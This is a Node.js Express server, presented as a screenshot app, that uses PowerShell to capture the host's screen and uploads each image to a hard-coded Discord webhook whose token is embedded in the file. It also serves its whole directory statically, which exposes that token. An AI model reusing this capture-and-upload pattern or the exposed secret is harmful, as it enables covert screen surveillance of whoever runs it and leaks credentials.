const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const FormData = require('form-data');
const fetch = require('node-fetch');

const app = express();
const PORT = 3000;

// Discord webhook URL
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1413280766208512111/O9G7lYVuX7oieCK9XisBl1EEf74lRxYjL83RRLnlKtnyRAgly42jKEmKElAINhHTPCdj';

// Serve static files
app.use(express.static('.'));

// Screenshot endpoint
app.post('/screenshot', async (req, res) => {
    try {
        console.log('Screenshot request received');
        
        // Generate unique filename
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `screenshot-${timestamp}.png`;
        const filepath = path.join(__dirname, filename);
        
        // Take screenshot using PowerShell (Windows)
        const screenshotCommand = `powershell -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $Width = $Screen.Width; $Height = $Screen.Height; $Left = $Screen.Left; $Top = $Screen.Top; $bitmap = New-Object System.Drawing.Bitmap $Width, $Height; $graphic = [System.Drawing.Graphics]::FromImage($bitmap); $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size); $bitmap.Save('${filepath}', [System.Drawing.Imaging.ImageFormat]::Png); $graphic.Dispose(); $bitmap.Dispose()"`;
        
        exec(screenshotCommand, async (error, stdout, stderr) => {
            if (error) {
                console.error('Screenshot error:', error);
                return res.status(500).json({ error: 'Failed to take screenshot' });
            }
            
            try {
                // Check if file was created
                if (!fs.existsSync(filepath)) {
                    console.error('Screenshot file not created');
                    return res.status(500).json({ error: 'Screenshot file not created' });
                }
                
                console.log('Screenshot taken successfully:', filename);
                
                // Send to Discord webhook
                const form = new FormData();
                form.append('content', `📸 New screenshot captured!`);
                form.append('file', fs.createReadStream(filepath), {
                    filename: filename,
                    contentType: 'image/png'
                });
                
                const webhookResponse = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    body: form
                });
                
                console.log('Discord webhook response status:', webhookResponse.status);
                console.log('Discord webhook response headers:', webhookResponse.headers);
                
                if (webhookResponse.ok) {
                    console.log('✅ Screenshot sent to Discord successfully');
                    
                    // Clean up the screenshot file
                    fs.unlinkSync(filepath);
                    
                    res.json({ 
                        success: true, 
                        message: 'Screenshot sent to Discord!',
                        filename: filename
                    });
                } else {
                    const errorText = await webhookResponse.text();
                    console.error('❌ Failed to send to Discord:', webhookResponse.status, errorText);
                    res.status(500).json({ error: 'Failed to send screenshot to Discord' });
                }
                
            } catch (webhookError) {
                console.error('Webhook error:', webhookError);
                res.status(500).json({ error: 'Failed to send screenshot to Discord' });
            }
        });
        
    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Start server
app.listen(PORT, () => {
    console.log(`🎮 Screenshot app running at http://localhost:${PORT}`);
    console.log(`📸 Click the link to take a screenshot!`);
});

// Graceful shutdown
process.on('SIGINT', () => {
    console.log('\n👋 Shutting down screenshot app...');
    process.exit(0);
});
